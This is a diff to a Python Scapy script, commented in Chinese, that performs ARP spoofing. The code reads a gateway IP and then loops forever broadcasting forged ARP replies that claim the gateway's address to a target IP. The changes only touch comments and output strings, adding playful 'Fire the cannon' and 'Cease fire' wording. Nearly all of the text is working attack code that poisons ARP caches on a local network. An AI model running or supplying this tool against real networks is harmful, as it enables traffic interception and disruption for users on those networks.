@@ -9,14 +9,14 @@ gateway_ip = input("请输入网关IP地址: ")
 packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=target_ip, hwdst="00:00:00:00:00:00", psrc=gateway_ip)
 sendp(packet)
 
-# 持续进行ARP欺骗攻击
+# 持续Fire the cannon！(开炮！)
 while True:
     try:
         # 发送伪造的ARP响应包给目标IP和网关IP，告诉他们自己就是对方
         packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=target_ip, hwdst="00:00:00:00:00:00", psrc=gateway_ip)
         sendp(packet)
-        print(f"已发送ARP欺骗攻击至 {target_ip} 和 {gateway_ip}")
+        print(f"已发送ARP攻击至 {target_ip}")
     except KeyboardInterrupt:
         # 如果用户按下Ctrl-C，则退出程序
-        print("用户中断程序")
+        print("用户中断程序（Cease fire）")
         sys.exit(0)
